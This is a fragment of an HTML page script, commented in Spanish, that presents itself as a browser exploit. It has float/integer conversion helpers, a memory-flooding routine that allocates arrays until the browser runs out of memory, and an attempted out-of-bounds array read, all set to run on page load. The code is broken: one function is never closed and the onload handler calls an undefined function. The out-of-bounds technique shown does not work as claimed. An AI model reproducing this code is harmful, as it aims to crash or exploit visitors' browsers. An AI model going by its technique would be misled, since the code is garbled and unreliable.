  <script>
    const log = document.getElementById("log");
    function print(msg) {
      console.log(msg);
      log.textContent += msg + "\n";
    }

    // Convierte float64 <-> int64 (64bit)
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);

    function f2i(f) {
      f64[0] = f;
      return u32[0] + u32[1] * 0x100000000;
    }

    function i2f(i) {
      u32[0] = i % 0x100000000;
      u32[1] = i / 0x100000000;
      return f64[0];
    }

    // 1. Saturar la memoria para preparar heap
    function memoryFlood() {
      const big = [];
      try {
        while (true) {
          big.push(new Uint8Array(50_000_000));
          if (big.length % 10 === 0) print(`💣 Memoria saturada: ${big.length * 50}MB aprox`);
        }
      } catch (e) {
        print("💥 Memoria saturada capturada: " + e);
      }
      return big;
    }

    // 2. Corrupción OOB tentativa en array
    function corruptArrayOOB() {
      print("[*] Intentando corrupción OOB");
      let arr = [1.1, 2.2, 3.3];
      try {
        Object.defineProperty(arr, 'length', { value: 0x100 });
        print("[+] Corrupt length a 0x100");
      } catch (e) {
        print("[-] No se pudo corromper length: " + e);
      }

      try {
        let leak = arr[0x80];
        print("[+] Leak OOB en arr[0x80]: " + leak);
      } catch (e) {
        print("[-] No se pudo leer fuera de límites: " + e);

    }

    window.onload = () => {
      setTimeout(aggressiveBase, 10);
    };
  </script>
